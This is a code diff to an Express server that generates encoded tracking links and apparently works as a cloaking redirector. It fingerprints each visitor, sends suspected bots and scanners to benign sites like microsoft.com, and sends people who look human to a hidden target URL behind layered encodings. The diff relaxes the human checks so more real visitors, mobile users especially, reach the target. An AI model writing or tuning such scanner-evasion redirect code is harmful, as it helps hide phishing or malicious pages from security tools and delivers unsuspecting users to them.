@@ -10,11 +10,8 @@ const app = express();
 
 app.set('trust proxy', 1);
 
-// ────────────────────────────────────────────────
-// CONFIGURATION
-// ────────────────────────────────────────────────
+// CONFIG
 const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';
-
 const BOT_URLS = [
   'https://www.microsoft.com',
   'https://www.apple.com',
@@ -32,9 +29,7 @@ const PORT = process.env.PORT || 10000;
 
 const geoCache = new NodeCache({ stdTTL: 86400, checkperiod: 600 });
 
-// ────────────────────────────────────────────────
 // MIDDLEWARE
-// ────────────────────────────────────────────────
 app.use((req, res, next) => {
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
   next();
@@ -58,16 +53,11 @@ app.use(express.urlencoded({ extended: true }));
 
 app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
 
-// ────────────────────────────────────────────────
-// HELPERS
-// ────────────────────────────────────────────────
 function isMobile(req) {
   return /android|iphone|ipad|ipod|mobi/i.test((req.headers['user-agent'] || '').toLowerCase());
 }
 
-// ────────────────────────────────────────────────
-// SERVER-SIDE BOT DETECTION (unchanged - already good)
-// ────────────────────────────────────────────────
+// SERVER BOT DETECTION (unchanged)
 const strictLimiter = rateLimit({
   windowMs: 60 * 1000,
   max: (req) => isMobile(req) ? 12 : 4,
@@ -87,7 +77,6 @@ function isLikelyBot(req) {
   const accept = req.headers['accept'] || '';
 
   let score = 0;
-
   if (suspiciousUA.some(r => r.test(ua))) score += 40;
   if (!ua.includes('mozilla')) score += 25;
   if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 20;
@@ -111,9 +100,7 @@ function isLikelyBot(req) {
   return score >= 70;
 }
 
-// ────────────────────────────────────────────────
-// GEO LOOKUP
-// ────────────────────────────────────────────────
+// GEO (unchanged)
 async function getCountryCode(req) {
   let ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) ||
            req.headers['x-real-ip'] ||
@@ -150,9 +137,7 @@ async function getCountryCode(req) {
   return 'XX';
 }
 
-// ────────────────────────────────────────────────
-// ENCODERS (fixed rot13)
-// ────────────────────────────────────────────────
+// ENCODERS (unchanged)
 const encoders = [
   { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
   { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
@@ -170,9 +155,6 @@ const encoders = [
   { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
 ];
 
-// ────────────────────────────────────────────────
-// MULTI-LAYER ENCODE / DECODE
-// ────────────────────────────────────────────────
 function multiLayerEncode(str) {
   let result = str;
   const noise = crypto.randomBytes(8).toString('hex');
@@ -206,9 +188,6 @@ function multiLayerDecode(encoded, layers, noise) {
   return result;
 }
 
-// ────────────────────────────────────────────────
-// /generate
-// ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
   const target = req.query.target || TARGET_URL;
   const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();
@@ -237,9 +216,7 @@ app.get('/generate', (req, res) => {
   res.json({ success: true, tracked: url });
 });
 
-// ────────────────────────────────────────────────
-// MAIN /r/* ROUTE – OPTIMIZED FOR PHONE & PC
-// ────────────────────────────────────────────────
+// OPTIMIZED /r/* ROUTE
 app.get('/r/*', strictLimiter, async (req, res) => {
   const ua = req.headers['user-agent'] || '';
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
@@ -257,7 +234,6 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
   fs.appendFile(LOG_FILE, `${new Date().toISOString()} PASS ${ip} ${country} UA:${ua}\n`, () => {});
 
-  // Decode target safely
   let redirectTarget = TARGET_URL;
   try {
     const params = new URLSearchParams(req.url.split('?')[1] || '');
@@ -322,7 +298,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
     function updateEntropy(dx, dy) {
       const dt = (Date.now() - lastTime) / 1000 || 1;
-      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.4; // slightly lower multiplier = more forgiving
+      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.2; // very forgiving
       lastTime = Date.now();
       moves++;
     }
@@ -342,7 +318,6 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
     document.addEventListener('visibilitychange', () => { if (document.hidden) focusLost++; });
 
-    // Canvas fingerprint - more forgiving check
     const c = document.createElement('canvas');
     const ctx = c.getContext('2d');
     ctx.textBaseline = 'top'; ctx.font = '14px Arial';
@@ -363,22 +338,18 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
       const suspicious =
         isHoneypotFilled() ||
-        entropy < (mobile ? 2.0 : 10.0) ||          // much more forgiving on mobile
-        moves < (mobile ? 0 : 3) ||                 // allow 0 moves on mobile
-        fp.includes('iVBORw0KGgo') && !mobile ||    // canvas strict only on desktop
+        entropy < (mobile ? 0.5 : 6) ||             // extremely forgiving on mobile
+        moves < (mobile ? 0 : 2) ||                 // 0 moves OK on phone
+        (fp.includes('iVBORw0KGgo') && !mobile) ||  // canvas only strict on desktop
         navigator.webdriver === true ||
-        (window.outerWidth === 0 || window.outerHeight === 0) ||
-        (navigator.languages?.length ?? 0) === 0 ||
-        navigator.maxTouchPoints === undefined ||
-        focusLost > (mobile ? 8 : 4);               // more tab switches allowed on phone
+        (window.outerWidth === 0 || window.outerHeight === 0);
 
       console.log(\`[GOD-CHECK] ent:\${entropy.toFixed(1)} mov:\${moves} hp:\${isHoneypotFilled() ? 'FILLED' : 'empty'} fpSusp:\${fp.includes('iVBORw0KGgo') ? 'yes' : 'no'} → \${suspicious ? 'BOT' : 'HUMAN'}\`);
 
       location.href = suspicious ? BOT : TARGET;
-    }, 1000 + Math.random() * 1200); // faster: 1–2.2 seconds
+    }, 800 + Math.random() * 1000); // fast: 0.8–1.8 seconds
 
-    // Fallback if JS disabled or very slow
-    setTimeout(() => location.href = BOT, 6000);
+    setTimeout(() => location.href = BOT, 5000);
   </script>
 </body>
 </html>
